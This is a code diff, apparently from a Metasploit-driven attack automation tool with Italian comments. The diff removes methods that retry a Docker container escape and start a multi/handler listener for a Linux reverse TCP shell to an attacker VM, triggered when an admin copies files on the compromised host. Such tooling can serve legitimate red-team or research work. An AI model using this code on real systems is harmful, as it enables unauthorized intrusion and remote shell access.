@@ -52,68 +52,7 @@ class MetaClient:
     def attempt_scan(self,scan_obj):
         scan_obj.scan()
         return
-    
-    
-    # Vengono eseguiti massimo 5 tentativi di docker escape e se uno dei tentativi ha successo viene restituito un dizionario con la sessione creata
-    def docker_escape(self, docker_escape_attack_object):
-        
-        sess={}
-        for i in range (0,5):
-            success =self.grab_docker_escape_conn()
-            #per richiamare docker escape dal database
-            #success = self.attempt_attack(docker_escape_attack_object)
-            if success:
-                Logger.log(self, f"connection from netcat established, docker_escape successful", level=Logger.INFO)
-                sess["escape_sess"]=success
-                break
-            else:
-                Logger.log(self, f"can't establish connection from netcat attempt {i} -", level=Logger.ERROR)
-        return sess
-    
-
-    # Questo metodo viene solo usato per il doker escape, per catturare la connessione che arriva una volta che un admin effettua una operazione di copia 
-    # sulla macchina infetta, permettendo così di farci avere una connessione sulla macchina effettuando il docker_escape
-    # restituisce la nuova sessione creata se il docker-escape ha successo
-    def grab_docker_escape_conn(self, payload="linux/x86/shell_reverse_tcp", sleep=True):
-        """
-        If a new session is created it returns the ip of the compromised machine, else it returns None.
-        """
-
-        self.old_sessions = None
-        self.new_sessions = None
-
-        self.old_sessions = self.get_active_sessions(sleep=sleep)
-        
-        aus_client = self.client
-        
-        handler_p = aus_client.modules.use('payload', payload)
-        handler_p['LHOST'] = C.ATTACKER_VM   # attacker ip
-        handler_p['LPORT'] = C.NETCAT_PORT   # port defined in config file to connect to the netcat port used by docker_escape
-
-        handler = aus_client.modules.use('exploit', 'multi/handler')
-        #print(self.get_active_sessions(sleep=sleep))
-        handler.execute(payload=handler_p)
-
-        delay(10)
-
-        self.new_sessions = self.get_active_sessions(sleep=sleep)
-        #print(self.get_active_sessions(sleep=sleep))
-
-        diff = set(self.new_sessions) - set(self.old_sessions)
-
-        if diff:
-            Logger.log(self, f"Netcat session created - {diff=}", level=Logger.INFO)
-            session={}
-            session["id_sess"]=diff.pop()
-            obtained_session = self.new_sessions[session["id_sess"]]
-            session["obtained_session"]=obtained_session
-            session["session_host"]=obtained_session["session_host"]
-            return session
-        else:
-            Logger.log(self, f"unable to create netcat session", level=Logger.ERROR)
-            return None
-    
-            
+     
 
     # Gestisce il processo di aggiornamento di una shell a una shell Meterpreter 
     # restituisce l'ID della sessione Meterpreter se l'aggiornamento ha avuto successo
